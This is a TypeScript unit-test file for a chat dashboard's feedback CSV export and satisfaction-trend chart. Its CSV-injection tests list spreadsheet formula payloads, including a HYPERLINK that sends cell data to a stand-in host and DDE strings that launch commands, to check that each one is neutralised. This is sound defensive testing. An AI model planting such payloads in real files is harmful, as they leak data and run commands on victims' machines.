/**
 * Date expectations here follow the DASHBOARD's locale (en-IN by default),
 * not a hardcoded en-US. Phase 7D routed every locale-sensitive format through
 * `src/i18n/formatters`, so "Jul 7" became "7 Jul": same field set, different
 * locale. A Hindi dashboard renders these in Devanagari; see
 * `src/i18n/formatters.test.ts`.
 */
/**
 * The two feedback helpers a customer reads conclusions off: the CSV export and
 * the satisfaction trend.
 *
 * Question and Answer are raw chat content (whatever a website visitor typed,
 * verbatim) so the export is the second place (after the lead exports) where
 * untrusted text leaves the product as a file the customer opens in Excel. The
 * escape itself is unit-tested in `lib/csvSafe.test.ts`; these prove it is
 * wired into the file that actually gets downloaded, and pin the two data-
 * integrity bugs the previous implementation shipped.
 */
import { afterEach, describe, expect, it, vi } from 'vitest';

import { type FeedbackItem } from './types';

import { buildFeedbackCsv, buildTrend } from './feedback-helpers';

const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'] as const;

function item(overrides: Partial<FeedbackItem> = {}): FeedbackItem {
  return {
    message_id: 1,
    created_at: '2026-08-13T10:00:00Z',
    question: 'How much does it cost?',
    answer: 'Plans start at 999 INR.',
    feedback: 1,
    user: 'User -3',
    ...overrides,
  };
}

/** Cells of one row, RFC-4180 unwrapped. Rows never contain a bare newline. */
function cells(csv: string, row: number): string[] {
  return (csv.split('\n')[row].match(/"(?:[^"]|"")*"/g) ?? []).map((cell) =>
    cell.slice(1, -1).replace(/""/g, '"'),
  );
}

describe('buildFeedbackCsv', () => {
  it('emits the documented header and one row per item', () => {
    const csv = buildFeedbackCsv([item(), item({ message_id: 2, feedback: -1 })]);

    expect(cells(csv, 0)).toEqual(['Date', 'User', 'Type', 'Question', 'Answer']);
    expect(csv.split('\n')).toHaveLength(3);
    expect(cells(csv, 1)[2]).toBe('Positive');
    expect(cells(csv, 2)[2]).toBe('Negative');
  });

  it('returns a header-only file for an empty log', () => {
    /* The button is clickable with the filters showing nothing; a valid
       header-only CSV is the honest answer, not a malformed file. */
    const csv = buildFeedbackCsv([]);

    expect(csv.split('\n')).toHaveLength(1);
    expect(cells(csv, 0)).toEqual(['Date', 'User', 'Type', 'Question', 'Answer']);
  });
});

describe('buildFeedbackCsv. CSV injection', () => {
  it.each([
    ['=HYPERLINK("https://evil.test/?"&A1,"Click")', 'formula'],
    ['+cmd|" /C calc"!A0', 'signed expression / DDE'],
    ['-2+3+cmd|" /C calc"!A0', 'signed expression / DDE'],
    ["@SUM(1+1)*cmd|' /C calc'!A0", 'legacy Lotus-style formula'],
    ['\t=1+1', 'TAB-prefixed formula'],
  ])('neutralises %j in a visitor question (%s)', (payload) => {
    /* The realistic vector: a visitor types this into the chat widget, the
       customer later exports their feedback log and opens it in Excel. */
    const csv = buildFeedbackCsv([item({ question: payload })]);

    const question = cells(csv, 1)[3];
    expect(question).toBe(`'${payload}`);
    expect(TRIGGERS.some((t) => question.startsWith(t))).toBe(false);
    // Defused, not dropped, the question stays readable.
    expect(question.slice(1)).toBe(payload);
  });

  it('neutralises a payload in every column', () => {
    /* A sweep over the columns as they exist today. What keeps a *future*
       column safe is the shared `csvField` funnel, not this test. */
    const csv = buildFeedbackCsv([
      item({
        user: '=1+1',
        question: '@SUM(1+1)',
        answer: '+cmd|" /C calc"!A0',
      }),
    ]);

    for (const cell of [...cells(csv, 0), ...cells(csv, 1)]) {
      expect(TRIGGERS.some((t) => cell.startsWith(t))).toBe(false);
    }
  });

  it('escapes a CR-prefixed answer', () => {
    /* CR is stripped by Excel before it decides whether the cell is a formula,
       so a check that only looks for '=' would miss this one. */
    const csv = buildFeedbackCsv([item({ answer: '\r=1+1' })]);

    expect(csv).toContain('"\'\r=1+1"');
    expect(csv).not.toContain('"\r=1+1"');
  });

  it('leaves ordinary content alone', () => {
    /* No stray quotes on real data, the escape is targeted at the leading
       character and nothing else. */
    const csv = buildFeedbackCsv([item()]);
    const row = cells(csv, 1);

    expect(row[1]).toBe('User -3');
    expect(row[3]).toBe('How much does it cost?');
    expect(row[4]).toBe('Plans start at 999 INR.');
  });
});

describe('buildFeedbackCsv. Data integrity', () => {
  it('keeps commas in the data instead of deleting them', () => {
    /* Regression: the previous implementation ran `.replace(/,/g, '')` over
       user, question and answer before quoting them. Quoting is what makes a
       comma safe; stripping it silently corrupted the export, and this is a
       one-way door, since the CSV is where the data leaves the product. */
    const csv = buildFeedbackCsv([
      item({
        question: 'Do you support Hindi, Marathi, and Tamil?',
        answer: 'Yes, all three.',
      }),
    ]);

    const row = cells(csv, 1);
    expect(row[3]).toBe('Do you support Hindi, Marathi, and Tamil?');
    expect(row[4]).toBe('Yes, all three.');
    // Still parses as 5 fields, the commas are inside quoted cells.
    expect(row).toHaveLength(5);
  });

  it('doubles embedded quotes in every column, including User', () => {
    /* Regression: `user` was comma-stripped but never quote-escaped, unlike
       the other columns, a quote in it broke the row apart for the parser. */
    const csv = buildFeedbackCsv([
      item({ user: 'User "3"', question: 'What is "RAG"?', answer: 'Retrieval-"augmented".' }),
    ]);

    const row = cells(csv, 1);
    expect(row[1]).toBe('User "3"');
    expect(row[3]).toBe('What is "RAG"?');
    expect(row[4]).toBe('Retrieval-"augmented".');
    expect(row).toHaveLength(5);
  });
});

/**
 * The satisfaction trend.
 *
 * Every assertion below names the actual days, because the failure mode here is
 * one that counting points cannot see. `/analytics/feedback` returns rows
 * newest-first (`sorted(…, reverse=True)` in `get_feedback_endpoint`), while
 * Recharts plots an array left-to-right, so the chart wants the opposite order
 * (oldest first) capped to the *most recent* 14 days. A cap that kept the wrong
 * end still returns 14 points and still renders a plausible-looking line; it
 * just shows a fortnight from weeks ago under a heading that says "trend". That
 * is worse than a blank chart, because nothing about it looks wrong, so the
 * only test that can catch it is one that pins which days survive.
 */
describe('buildTrend', () => {
  afterEach(() => {
    vi.useRealTimers();
  });

  /** One rating on 2026-07-`day`, as the ISO instant the API sends. */
  function ratedOn(day: number, feedback: 1 | -1): FeedbackItem {
    return item({
      message_id: day,
      created_at: new Date(2026, 6, day, 12).toISOString(),
      feedback,
    });
  }

  /**
   * Twenty consecutive days, newest first, the order the endpoint returns.
   * Only the newest day is positive, so each day's rate identifies it.
   */
  const twentyDays = Array.from({ length: 20 }, (_, index) =>
    ratedOn(20 - index, index === 0 ? 1 : -1),
  );

  it('keeps the most recent 14 days, not the oldest 14', () => {
    /* The bug this pins: `.slice(-14)` over newest-first input takes from the
       wrong end, so the chart rendered 1 Jul-14 while the customer's latest
       week (the only part they can still act on) was dropped. */
    expect(buildTrend(twentyDays, 0).map((point) => point.date)).toEqual([
      '7 Jul',
      '8 Jul',
      '9 Jul',
      '10 Jul',
      '11 Jul',
      '12 Jul',
      '13 Jul',
      '14 Jul',
      '15 Jul',
      '16 Jul',
      '17 Jul',
      '18 Jul',
      '19 Jul',
      '20 Jul',
    ]);
  });

  it("carries each day's own numbers, with the newest day last", () => {
    /* Order and payload pinned together: a chart whose last point is not the
       newest day is reading right-to-left, whatever the labels say. */
    const points = buildTrend(twentyDays, 0);

    expect(points.at(-1)).toEqual({ date: '20 Jul', rate: 100, total: 1 });
    expect(points.at(0)).toEqual({ date: '7 Jul', rate: 0, total: 1 });
  });

  it('keeps every day, oldest first, when there are fewer than 14', () => {
    /* Below the cap the slice is a no-op, so this isolates the orientation:
       chronological is a property of the output, not a side effect of the cap. */
    const threeDays = [ratedOn(3, 1), ratedOn(2, -1), ratedOn(1, 1)];

    expect(buildTrend(threeDays, 0).map((point) => point.date)).toEqual([
      '1 Jul',
      '2 Jul',
      '3 Jul',
    ]);
  });

  it('does not depend on the order the endpoint returned rows in', () => {
    /* The coupling that caused the bug: the helper inferred chronology from
       the caller's sort order. `get_feedback_endpoint` could switch to `ORDER
       BY created_at` tomorrow (a change with no visible connection to this
       chart) and the wrong fortnight would silently come back. */
    expect(buildTrend([...twentyDays].reverse(), 0)).toEqual(buildTrend(twentyDays, 0));
  });

  it('applies the `days` window before capping', () => {
    /* The 7d/30d segmented control feeds this argument; the 14-bucket cap is a
       second, independent limit on top of it. */
    vi.useFakeTimers();
    vi.setSystemTime(new Date(2026, 6, 20, 18));

    expect(buildTrend(twentyDays, 7).map((point) => point.date)).toEqual([
      '14 Jul',
      '15 Jul',
      '16 Jul',
      '17 Jul',
      '18 Jul',
      '19 Jul',
      '20 Jul',
    ]);
  });

  it('rounds the daily rate over every rating in the day', () => {
    /* The arithmetic, on a day that is neither all-positive nor all-negative,
       the single-rating days above exercise only 100 and 0, so a bucket that
       summed wrongly or divided by the wrong denominator would still pass them.
       1 of 3 is 33.33%, which also pins the rounding rather than truncation. */
    const oneOfThree = [ratedOn(5, 1), ratedOn(5, -1), ratedOn(5, -1)];

    expect(buildTrend(oneOfThree, 0)).toEqual([{ date: '5 Jul', rate: 33, total: 3 }]);

    // 2 of 3 is 66.67%. Rounds up, so the two cases together show it is not
    // flooring.
    const twoOfThree = [ratedOn(6, 1), ratedOn(6, 1), ratedOn(6, -1)];
    expect(buildTrend(twoOfThree, 0)).toEqual([{ date: '6 Jul', rate: 67, total: 3 }]);
  });

  it('keeps the same calendar day in different years apart', () => {
    /* The label carries no year, so keying buckets on it merged this 21 Jul
       with last year's into one averaged point. Reachable from the "All" range
       on any workspace older than a year, and the merged bucket took the older
       timestamp, so it also sorted as ancient and could fall out of the most
       recent 14 entirely. Two real days, two points. */
    const acrossYears = [
      item({ message_id: 1, created_at: new Date(2026, 6, 21, 12).toISOString(), feedback: 1 }),
      item({ message_id: 2, created_at: new Date(2025, 6, 21, 12).toISOString(), feedback: -1 }),
    ];

    expect(buildTrend(acrossYears, 0)).toEqual([
      { date: '21 Jul', rate: 0, total: 1 },
      { date: '21 Jul', rate: 100, total: 1 },
    ]);
  });
});
